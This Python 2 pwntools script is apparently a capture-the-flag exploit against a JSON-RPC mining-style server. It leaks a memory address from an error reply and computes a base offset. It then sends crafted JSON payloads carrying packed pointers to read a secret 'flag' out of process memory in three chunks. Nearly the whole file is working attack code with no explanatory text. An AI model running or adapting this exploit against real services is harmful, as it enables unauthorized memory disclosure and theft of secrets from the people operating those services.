#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from pwn import *
import sys
timeout = 0.7

try:
    from termcolor import colored
except:
    # if termcolor import failed, use the following v1.1.0 source code of termcolor here
    # since termcolor use MIT license, SATA license above should be OK
    ATTRIBUTES = dict( list(zip([ 'bold', 'dark', '', 'underline', 'blink', '', 'reverse', 'concealed' ], list(range(1, 9)))))
    del ATTRIBUTES['']
    HIGHLIGHTS = dict( list(zip([ 'on_grey', 'on_red', 'on_green', 'on_yellow', 'on_blue', 'on_magenta', 'on_cyan', 'on_white' ], list(range(40, 48)))))
    COLORS = dict(list(zip(['grey', 'red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white', ], list(range(30, 38)))))
    RESET = '\033[0m'

    def colored(text, color=None, on_color=None, attrs=None):
        fmt_str = '\033[%dm%s'
        if color is not None: text = fmt_str % (COLORS[color], text)
        if on_color is not None: text = fmt_str % (HIGHLIGHTS[on_color], text)
        if attrs is not None:
            for attr in attrs:
                text = fmt_str % (ATTRIBUTES[attr], text)

        text += RESET
        return text

print "Usage: %s <host> <port> [idr]\n\ti: interact at end\n\td: diff response and expected response" % (sys.argv[0])
def diffstr(content, expected):
    if len(sys.argv) >= 4 and "d" in sys.argv[3]:
        import difflib
        differ = difflib.ndiff(expected, content)
        for i in differ:
            text = repr(i[-1])[1:-1]
            if i[0] == " ":
                sys.stdout.write(text)
            if i[0] == "+":
                sys.stdout.write(colored(text, on_color="on_red"))
            if i[0] == "-":
                sys.stdout.write(colored(text, on_color="on_blue"))
        sys.stdout.write("\n")
        sys.stdout.flush()
r = remote(sys.argv[1], 10001)
__content = ""
data = '{"paramsid": 3269594, "method": ["hello"]}\n'
print("\033[36m{}\033[0m".format(data))
r.send('{"paramsid": 3269594, "method": ["hello"]}\n')
__content = r.recvrepeat(timeout = timeout)
__expected =  '{"id":3269594,"result":false,"error":["\'\x98\x94\x01\' is not supported"]}'
diffstr(__content, __expected)

print __content[__content.find(',"result":false,"error":["')+1+len(',"result":false,"error":["'):__content.find("\' is not suppo")-1]
m_addr = u64(__content[__content.find(',"result":false,"error":["')+1+len(',"result":false,"error":["'):__content.find("\' is not suppo")].ljust(8,"\x00"))
print hex(m_addr)
m_addr = m_addr - 0x019498

print "m_addr=",hex(m_addr)

payload = '{"id":"1234","method":"client.exchange.flag","params":[222]}'
print payload
r.sendline(payload)
r.sendline("{\"id\":"+"2147483648"+",\"method\":\"" + "A" + "\",\"params\":[\"123\"]}")



# leak 1


flag = m_addr + 0x1d60
flag_ptr = m_addr + 0x2182
flag_ptr_ptr = m_addr + 0x2198
print("m_addr = {}".format(hex(m_addr))) 
print r.recvrepeat(timeout)

payload = '{"id":"0","method":"DDDDDD","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
print payload

r.sendline(payload)
print r.recvrepeat(timeout)
payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

r.sendline(payload)
data = r.recvrepeat(timeout)
read_flag = data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]

# leak 2

flag = m_addr + 0x1d70
flag_ptr = m_addr + 0x2182
flag_ptr_ptr = m_addr + 0x2198
print r.recvrepeat(timeout)
payload = '{"id":"0","method":"EEEEEE","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
print payload

r.sendline(payload)
#print r.recv(0x100)
payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'


r.sendline(payload)
data = r.recvrepeat(timeout)
read_flag += data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]

# leak 3


flag = m_addr + 0x1d80
print r.recvrepeat(timeout)
payload = '{"id":"0","method":"FFFFFF","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
print payload

r.sendline(payload)
#print r.recv(0x100)
payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'


r.sendline(payload)

data = r.recvrepeat(timeout)
read_flag += data[data.find('set_difficulty","params":["')+len('set_difficulty","params":["'):data.find("000000000000000000000000000000000000000000000000")]
print "BFS"*4+read_flag
r.close()









r.interactive()



